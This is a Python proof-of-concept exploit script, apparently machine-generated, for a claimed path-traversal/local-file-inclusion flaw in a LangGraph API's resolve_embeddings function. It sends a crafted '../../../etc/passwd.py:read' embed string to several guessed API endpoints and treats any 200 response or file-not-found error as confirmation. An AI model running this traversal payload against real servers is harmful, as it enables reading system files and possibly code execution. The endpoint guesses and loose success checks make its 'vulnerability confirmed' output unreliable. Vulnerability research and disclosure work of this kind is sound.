#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-034
# Sink: resolve_embeddings
# Auto-generated — run with: python3 lfi_if_string_contains_resolve_embeddings_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_api_src.

Vulnerability: The resolve_embeddings function in graph.py accepts an 'embed'
string from index_config. If the string contains '.py:', it extracts a module_name
and uses it in importlib.util.spec_from_file_location without sanitizing path
traversal sequences like '../'. This allows an attacker to import arbitrary Python
files from the filesystem, leading to local file inclusion (LFI) and potential
code execution if the imported file contains malicious code.

This PoC demonstrates the vulnerability by attempting to read /etc/passwd via
a crafted embed string that triggers the vulnerable code path.
"""

import requests
import sys
import json

# Configuration
TARGET_URL = "http://localhost:8000"  # Change this to the target server
TIMEOUT = 10

def exploit_lfi(target_url, file_to_read="/etc/passwd"):
    """
    Attempt to exploit the LFI vulnerability by crafting a malicious embed string.
    
    The vulnerable code path is triggered when:
    1. The embed string contains '.py:'
    2. The module_name contains '/' (path separator)
    
    We craft a payload that uses path traversal to include arbitrary files.
    Since the code expects a Python file, we'll try to read /etc/passwd as a
    demonstration (it will fail to import but the error message may leak content).
    """
    
    # Craft the malicious embed string
    # The format is: <path_to_file>.py:<function_name>
    # We use path traversal to reach /etc/passwd
    # Note: The code expects a .py file, but we can try to read any file
    payload = f"../../../{file_to_read.lstrip('/')}.py:read"
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Attempting to read: {file_to_read}")
    print(f"[*] Payload: {payload}")
    
    # The vulnerable function is called when creating/updating a vector store index
    # We need to find the appropriate API endpoint that accepts index_config
    # Based on the code, this is likely in the graph API
    
    # Try different API endpoints that might accept index_config
    endpoints = [
        "/api/graphs/default/index",  # Common endpoint for index operations
        "/api/index",                  # Alternative endpoint
        "/api/vectorstore",            # Another possibility
    ]
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        print(f"\n[*] Trying endpoint: {url}")
        
        # Prepare the malicious index_config
        index_config = {
            "embed": payload,
            # Add other required fields that might be needed
            "dimensions": 1536,
            "index_type": "vector"
        }
        
        try:
            # Try POST request (most common for creating/updating)
            response = requests.post(
                url,
                json=index_config,
                timeout=TIMEOUT,
                headers={"Content-Type": "application/json"}
            )
            
            print(f"[*] Status: {response.status_code}")
            print(f"[*] Response: {response.text[:500]}...")
            
            # Check if we got any useful information
            if response.status_code == 200:
                print("[+] Success! Server accepted the payload")
                return True
            elif "Could not find embeddings file" in response.text:
                print("[+] Vulnerability confirmed! Error message reveals path handling")
                return True
            elif "FileNotFoundError" in response.text or "No such file" in response.text:
                print("[+] Vulnerability confirmed! File system access attempted")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection failed to {url}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout connecting to {url}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    # Try GET request with query parameters (some APIs use this)
    print("\n[*] Trying GET request with query parameters...")
    try:
        params = {
            "index_config": json.dumps({"embed": payload})
        }
        response = requests.get(
            f"{target_url}/api/graphs/default",
            params=params,
            timeout=TIMEOUT
        )
        print(f"[*] Status: {response.status_code}")
        print(f"[*] Response: {response.text[:500]}...")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

def main():
    """Main function to run the exploit."""
    
    print("=" * 60)
    print("LangGraph API LFI Proof-of-Concept")
    print("=" * 60)
    print()
    
    # Try to read /etc/passwd as a benign demonstration
    success = exploit_lfi(TARGET_URL, "/etc/passwd")
    
    if not success:
        print("\n[*] Trying alternative approach - reading a Python file...")
        # Try to read a Python file that exists on the system
        # This is more likely to trigger the vulnerable code path
        success = exploit_lfi(TARGET_URL, "/tmp/lg-api-dl/langgraph_api_src/langgraph_api/graph")
    
    if success:
        print("\n[+] Vulnerability successfully exploited!")
        print("[*] The server attempted to load the specified file, confirming LFI.")
    else:
        print("\n[-] Could not confirm vulnerability with the tested endpoints.")
        print("[*] The target may not be running or the API endpoints differ.")
        print("[*] Try adjusting TARGET_URL or exploring the API documentation.")

if __name__ == "__main__":
    main()
